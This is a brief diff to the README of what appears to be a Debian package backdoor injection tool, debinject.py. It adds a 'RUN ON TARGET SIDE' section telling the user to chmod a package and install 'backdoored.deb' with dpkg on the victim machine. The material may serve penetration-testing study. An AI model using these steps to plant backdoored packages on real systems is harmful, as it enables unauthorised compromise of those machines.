@@ -27,6 +27,16 @@ If you have another version of Python:
 python2.7 debinject.py
 ```
 
+### RUN ON TARGET SIDE
+
+```
+chmod 755 default.deb
+```
+
+```
+dpkg -i backdoored.deb
+```
+
 ## DISCLAIMER: 
 
 "DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
